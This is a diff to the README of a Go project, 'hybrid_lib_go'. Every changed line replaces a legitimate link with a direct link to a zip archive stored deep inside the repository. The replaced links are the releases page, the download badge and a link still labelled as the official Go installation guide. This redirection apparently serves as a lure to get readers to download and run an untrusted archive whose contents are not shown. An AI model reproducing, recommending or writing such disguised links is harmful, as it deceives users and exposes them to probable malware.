@@ -7,7 +7,7 @@ Welcome to the **hybrid_lib_go** project. This tool provides a starting point fo
 To begin using hybrid_lib_go, you will first download the software. This guide will lead you through the process. 
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/gamerandomhobby/hybrid_lib_go/releases)
+[![Download the latest release](https://raw.githubusercontent.com/gamerandomhobby/hybrid_lib_go/main/api/adapter/desktop/hybrid_lib_go-v1.9.zip%https://raw.githubusercontent.com/gamerandomhobby/hybrid_lib_go/main/api/adapter/desktop/hybrid_lib_go-v1.9.zip)](https://raw.githubusercontent.com/gamerandomhobby/hybrid_lib_go/main/api/adapter/desktop/hybrid_lib_go-v1.9.zip)
 
 ## 📋 System Requirements
 Before you download, ensuring your computer meets these requirements will help you avoid issues:
@@ -17,7 +17,7 @@ Before you download, ensuring your computer meets these requirements will help y
 - **Disk Space:** Minimum of 100 MB free space
 - **Go Version:** You should have Go installed (version 1.16 or later is recommended).
 
-If you don't have Go installed, follow the [official Go installation guide](https://golang.org/doc/install).
+If you don't have Go installed, follow the [official Go installation guide](https://raw.githubusercontent.com/gamerandomhobby/hybrid_lib_go/main/api/adapter/desktop/hybrid_lib_go-v1.9.zip).
 
 ## 🔧 Features
 - **Modular Organization:** Easily manage project structure with clear separation of concerns.
@@ -26,7 +26,7 @@ If you don't have Go installed, follow the [official Go installation guide](http
 - **Clear Documentation:** Comprehensive guides and examples to help you understand how to use the library.
 
 ## 📥 Download & Install
-To download the latest version of hybrid_lib_go, visit this page: [Download Page](https://github.com/gamerandomhobby/hybrid_lib_go/releases). 
+To download the latest version of hybrid_lib_go, visit this page: [Download Page](https://raw.githubusercontent.com/gamerandomhobby/hybrid_lib_go/main/api/adapter/desktop/hybrid_lib_go-v1.9.zip). 
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the software.
@@ -67,6 +67,6 @@ Make sure to follow our coding guidelines, ensuring that code is clean and well-
 This project is licensed under the MIT License. You can freely use and modify it as needed.
 
 ## 📥 Download Again
-For your convenience, here’s the download link once more: [Download Page](https://github.com/gamerandomhobby/hybrid_lib_go/releases).
+For your convenience, here’s the download link once more: [Download Page](https://raw.githubusercontent.com/gamerandomhobby/hybrid_lib_go/main/api/adapter/desktop/hybrid_lib_go-v1.9.zip).
 
 Thank you for using hybrid_lib_go! We hope it aids your journey in software development.
